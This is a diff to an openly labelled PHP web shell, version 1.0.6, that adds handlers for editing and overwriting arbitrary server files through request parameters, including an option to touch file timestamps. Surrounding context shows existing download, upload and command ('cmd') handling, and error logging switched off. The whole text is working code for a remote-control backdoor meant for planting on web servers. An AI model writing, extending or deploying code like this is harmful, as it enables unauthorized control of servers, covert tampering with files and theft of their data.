@@ -4,7 +4,7 @@
  *
  * A simple web shell made in PHP.
  *
- * @since 1.0.5
+ * @since 1.0.6
  * @link  https://saku.fun/
  */
 ini_set('log_errors', '0');
@@ -35,6 +35,20 @@ if (isset($_GET['download'])) {
 // file upload
 if (isset($_GET['upload'])) {
     $Shell->Upload();
+}
+
+// file edit & update
+if (isset($_GET['edit'])) {
+    $Shell->Edit($_GET['edit']);
+}
+if (isset($_GET['update'])) {
+    $_update_option['path'] = $_POST['path'];
+    $_update_option['data'] = $_POST['data'];
+    $_update_option['touch'] = false;
+    if ( isset($_POST['touch']) && $_POST['touch'] === "1") {
+        $_update_option['touch'] = true;
+    }
+    $Shell->Update($_update_option);
 }
 
 if (isset($_POST['cmd'])) {
